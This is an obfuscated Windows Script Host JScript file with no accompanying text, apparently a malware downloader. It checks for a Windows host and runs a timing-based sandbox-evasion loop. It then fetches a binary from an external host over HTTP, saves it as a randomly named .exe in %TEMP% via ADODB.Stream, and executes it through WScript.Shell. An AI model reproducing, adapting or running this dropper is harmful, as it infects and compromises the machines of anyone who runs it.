var _T = false;
var _YC = "CreateObject";
var _BI = function _JK() {return WScript[_YC]("WScript"+".Shell");}(), _M1 = 11;
var _X = "MSXML2.XMLHTTP";
var _TT = 2123213;
var _UV = 0;
function _S(_BG){_BI["Run"](_BG, _UV, _UV);};
function _UP(){return _X + "";};
function _L(_IC, _C){_UV = _UV * 1; return _IC - _C;};
function _O(){return _YC;};
/*@cc_on
  @if (@_win32 || @_win64)
    _T = true;
  @end
@*/
if (_T)
{
var _ZA = "";
function _CH(){return 22;};
var _ZF = 0; var _IM = 0;
function _SX()
{
var _I = new this["Date"]();
var _FW = _I["getUTCMilliseconds"]();
WScript["Sleep"](_CH());
var _I = new this["Date"]();
var _GG = _I["getUTCMilliseconds"]();
WScript["Sleep"](_CH());
var _I = new this["Date"]();
var _LE = _I["getUTCMilliseconds"]();
var _ZF = "_UT";
_ZF = _L(_GG, _FW);
var _IM = "_XB";
_IM = _L(_LE, _GG);
_ZA = "open";
return _L(_ZF, _IM);
}
var _F = false;
var _XX = false;
for (var _SI = _UV; _SI < _CH() * 1; _SI++){if (_SX() != _UV){
_F = true; 
_IM = "31" + 11 * _ZF + _IM; 
_XX = true; 
break;
}}
function _LD() {return ((_F == true) && (_F == _XX)) ? 1 : _UV;};
if (_F && _LD() && _XX){
function _LF() {return _BI["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "3NAerJLdWu59ax.ex" + "e";};
 _LU = _UP();
 _J = WScript[_YC](_LU);
 var _XC = 1;
 while (_XC){
try {
	if (_XC == 1)
	{
		_J[_ZA]("GET", "http://zakazdetali.kz/v7bsad", false);
		_J["send"]();
		_LB = "Sleep";
	}
	WScript[_LB](_CH() + 120); 
	if (_J["readystate"] < 2 * 2) continue;
	_XC = _UV;
	function _M(_B) {var _SW = (1, 2, 3, 4, 5, _B); return _SW;};
	_E = WScript[_O()]("ADODB.Stream");
	_LU = _E;
	_LU[_ZA]();
	_LU["type"] = _M(1);
	_LU["write"](_J["ResponseBody"]);
	_E["position"] = _M(_UV);
	_LU["Save" + "ToFile"](_LF(), 2);
	_E["cl"+"ose"]();
	_M0 = _LF();
	_S(_M0);
} catch(_X0){};
}
}
}

